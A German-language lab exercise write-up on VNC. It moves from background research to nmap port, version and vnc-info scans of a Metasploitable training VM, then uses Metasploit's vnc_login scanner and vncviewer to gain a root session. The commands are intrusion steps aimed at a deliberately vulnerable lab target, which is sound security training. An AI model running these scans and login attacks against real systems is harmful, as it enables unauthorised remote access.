## Übung (VNC - Recherche)
### Angabe
Recherchiere Basics zu VNC (Virtual Network Computing).

### Recherche
VNC ist eine Technologie, mit der man einen Computer über ein Netzwerk aus der Ferne steuern kann. Dabei sieht der Benutzer auf seinem eigenen Gerät den Desktop eines anderen Computers und kann diesen mit Maus und Tastatur bedienen, als würde er direkt davor sitzen. VNC arbeitet nach einem Client-Server-Prinzip: Auf dem entfernten Computer läuft ein VNC-Server, der den Bildschirminhalt über das Netzwerk sendet, während auf dem eigenen Gerät ein VNC-Client läuft, der den Bildschirm anzeigt und Eingaben überträgt. Die Kommunikation erfolgt über das Remote Framebuffer Protocol, bei dem hauptsächlich Bildschirmänderungen und Benutzereingaben übertragen werden. VNC funktioniert auf vielen Betriebssystemen wie Windows, Linux und macOS und kann sowohl im lokalen Netzwerk als auch über das Internet eingesetzt werden, es wird auch oft für IT-Support hergenommen, also Fernwartungen.


## Übung( VNC - Scan)

### Angabe
Scanne mit nmap den VNC Port auf Metasploitable. Teste Version und Banner. Verwende das nmap Script vnc-info.

### Lösung
Erstmal muss man schauen ob der Standart Port für VNC offen ist, das ist der Port 5900. 
Das macht man mit folgendem Befehl:

```
nmap -p 5900 192.168.96.131
```
192.168.96.131 das ist bei mir die IP Adresse von Metasploitable.    

So sieht dann die Ausgabe nach dem eingegebenen Befehl aus:
```
┌──(kali㉿kali)-[~]
└─$ nmap -p 5900 192.168.96.131
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-09 06:53 EDT
Nmap scan report for 192.168.96.131
Host is up (0.0011s latency).
 
PORT     STATE SERVICE
5900/tcp open  vnc
MAC Address: 00:0C:29:DA:B4:EB (VMware)
 
Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

Hier kann man heraus lesen dass der Standard Port, also 5900, offen ist.


#### Banner und Version testen
Jetzt muss man Banner und Version herausfinden, das macht man mit folgendem Befehl:
```
nmap -sV -p 5900 192.168.96.131
```

Ausgabe nach diesem Befehl:
```
PORT     STATE SERVICE VERSION

5900/tcp open  vnc     VNC (protocol 3.3)

MAC Address: 00:0C:29:DA:B4:EB (VMware)
```


#### Verwendung von vnc-info

Befehl:
```
nmap -p 5900 --script vnc-info 192.168.96.131
```

Ausgabe:
```
PORT     STATE SERVICE

5900/tcp open  vnc

| vnc-info: 

|   Protocol version: 3.3

|   Security types: 

|_    VNC Authentication (2)

MAC Address: 00:0C:29:DA:B4:EB (VMware)
```


## Übung (VNC - Exploit)
### Angabe
Metasploitable enthält eine Schwachstelle im VNC Server.

In metasploit gibt es ein Modul unter auxiliary/scanner/vnc das auf Login Vulnerabilities testet. Verwende dieses Modul.
Anschließend liegen genug Informationen vor um eine VNC Verbindung von Kali auf Metasploitable aufzubauen (mit vncviewer). Als welcher User bist du nun eingeloggt?

### Lösung
Erst mal auf der Kali VM Metasploitable starten mit "msfconsole". Dort dann "search vnc", durch diesen Befehl kommt eine sehr lange Ausgabe bei der man bis rauf scrollen muss damit man zum auxiliary kommt. Dann muss man dieses Modul laden mit folgendem Befehl:
```
use auxiliary/scanner/vnc/vnc_login
```
wenn man rein kommt, muss man sich die Optionen anzeigen lassen mit dem Befehl:
```
show options
```
jetzt muss man noch die Ziel IP setzen und dann starten mit diesen Befehlen:
```
set RHOSTS 192.168.96.131
run
``` 
bei der Ausgabe steht dann das Passwort, welches man später nochmal braucht um die Verbindung aufzubauen.    

Um die VNC Verbindung aufzubauen muss man folgendes eingeben:
```
vncviewer 192.168.96.131:5900
```

Ich wurde als root angemeldet "root@metasploitable:/#".
